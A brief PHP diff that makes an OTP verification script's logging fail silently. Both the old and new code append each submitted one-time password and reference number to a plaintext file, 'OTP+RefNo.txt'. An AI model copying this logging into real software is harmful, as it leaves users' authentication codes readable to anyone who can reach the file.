@@ -26,9 +26,11 @@ if (empty($user_otp) || empty($referenceNo)) {
 
 // Log OTP verification attempt
 try {
-    $myfile = fopen("OTP+RefNo.txt", "a+") or die("Unable to open file!");
-    fwrite($myfile, "OTP:" . $user_otp . " RefNo:" . $referenceNo . " Date:" . $date_ . "\n");
-    fclose($myfile);
+    $myfile = @fopen("OTP+RefNo.txt", "a+");
+    if ($myfile) {
+        fwrite($myfile, "OTP:" . $user_otp . " RefNo:" . $referenceNo . " Date:" . $date_ . "\n");
+        fclose($myfile);
+    }
 } catch (Exception $e) {
     // Continue even if logging fails
 }
